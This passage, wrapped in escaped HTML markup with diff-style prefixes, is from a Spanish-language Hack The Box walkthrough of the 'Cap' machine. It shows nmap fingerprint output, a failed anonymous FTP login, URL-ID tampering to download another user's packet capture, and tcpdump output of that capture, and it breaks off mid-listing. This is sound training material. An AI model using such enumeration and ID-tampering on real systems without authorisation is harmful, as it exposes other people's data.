class=&quot;s2&quot;&gt;/static/c
-SF:ss/slicknav&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;!--&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20amchar&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HTTPOption
-SF:s,B3,&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20200&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20OK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Server:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20gunicorn&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Date:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Mon,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2
-SF:023&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Aug&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;202021&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2000:31:10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20GMT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Connection:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20close&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Conten
-SF:t-Type:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20text/html;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20charset=utf-8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Allow:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20OPTIONS,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20HEAD,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:20GET&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Length:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RTSPRequest,121,&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2
-SF:0400&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Bad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Request&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Connection:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20close&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20text
-SF:/html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Length:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20196&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;head&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20
-SF:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;title&amp;gt;Bad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Request&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;body&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Invali
-SF:d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20HTTP&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Version&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;amp;#x27;Invalid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20HTTP&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Version:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;amp;#x27;RTSP
-SF:/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0&amp;amp;#x27;&amp;amp;#x27;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FourOhFourRequest,189
-SF:,&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20404&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20NOT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20FOUND&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Server:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20gunicorn&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Date:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20M
-SF:on,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2023&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Aug&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;202021&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2000:31:15&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20GMT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Connection:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20close&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:Content-Type:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20text/html;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20charset=utf-8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Length:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20232&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-SF:r&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;!DOCTYPE&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20HTML&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20PUBLIC&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-//W3C//DTD&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20HTML&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;203&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20
-SF:Final//EN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;title&amp;gt;404&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Not&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Found&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;h1&amp;gt;Not&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Found&amp;lt;/h1&amp;gt;
-SF:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;p&amp;gt;The&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20requested&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20URL&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20was&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20not&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20found&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20on&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20the&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20ser
-SF:ver&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20If&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20you&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20entered&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20the&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20URL&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20manually&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20please&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20ch
-SF:eck&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20your&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20spelling&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20and&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20try&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20again&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-Service Info: OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;132.16 seconds
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Se valida si el servicio FTP permite la autenticación del usuario &lt;em&gt;anonymous&lt;/em&gt;; sin embargo, no se puede ingresar.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.245
-Connected to 10.10.10.245.
-220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.245:kamiyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
-331 Please specify the password.
-Password:
-530 Login incorrect.
-Login failed.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Se observa el puerto 80 abierto, por lo que se procede a abrir el sitio web. Dentro del panel de navegación, se observa un recurso con nombre &lt;em&gt;Security Snapshot (5 Second PCAP + Analysis)&lt;/em&gt; y en la dirección URL se accede a &lt;em&gt;data/1&lt;/em&gt;; por lo que se procede a modificar el valor de 1 a distintos digitos para observa algun cambio en la web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-cap/cap_web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para el número 0, se observan datos capturados, por lo que se procede a descargar el archivo &lt;em&gt;0.pcap&lt;/em&gt; para su análisis.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ tcpdump &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 0.pcap
-reading from file 0.pcap, link-type LINUX_SLL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Linux cooked v1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, snapshot length 262144
-08:12:49.958142 IP 192.168.196.1.54399 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;2397486956, win 64240, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
-08:12:49.958169 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54399: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;239420785, ack 2397486957, win 64240, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
-08:12:49.958332 IP 192.168.196.1.54399 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 1, win 4106, length 0
-08:12:49.958383 IP 192.168.196.1.54399 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1:399, ack 1, win 4106, length 398: HTTP: GET / HTTP/1.1
-08:12:49.958388 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54399: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 399, win 501, length 0
-08:12:49.959884 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54399: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1:18, ack 399, win 501, length 17: HTTP: HTTP/1.0 200 OK
-08:12:49.960000 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54399: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FP.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;18:1396, ack 399, win 501, length 1378: HTTP
-08:12:49.960263 IP 192.168.196.1.54399 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 1397, win 4100, length 0
-08:12:49.960350 IP 192.168.196.1.54399 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;F.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;399, ack 1397, win 4100, length 0
-08:12:49.960364 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54399: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 400, win 501, length 0
-08:12:50.000377 IP 192.168.196.1.54400 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;2604434004, win 64240, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
-08:12:50.000415 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54400: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;4244414476, ack 2604434005, win 64240, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
-08:12:50.000613 IP 192.168.196.1.54400 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 1, win 4106, length 0
-08:12:50.000671 IP 192.168.196.1.54400 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1:361, ack 1, win 4106, length 360: HTTP: GET /static/main.css HTTP/1.1
-08:12:50.000677 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54400: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 361, win 501, length 0
-08:12:50.002467 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54400: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1:18, ack 361, win 501, length 17: HTTP: HTTP/1.0 200 OK
-08:12:50.002607 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54400: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FP.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;18:1009, ack 361, win 501, length 991: HTTP
-08:12:50.002901 IP 192.168.196.1.54400 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 1010, win 4102, length 0
-08:12:50.003064 IP 192.168.196.1.54400 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;F.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;361, ack 1010, win 4102, length 0
-08:12:50.003079 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54400: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.], ack 362, win 501, length 0
-08:12:50.406059 IP 192.168.196.1.54410 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.16.http: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;2049716514, win 64240, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
-08:12:50.406094 IP 192.168.196.16.http &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.196.1.54410: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;S.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;2608738359, ack 2049716515, win 64240, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
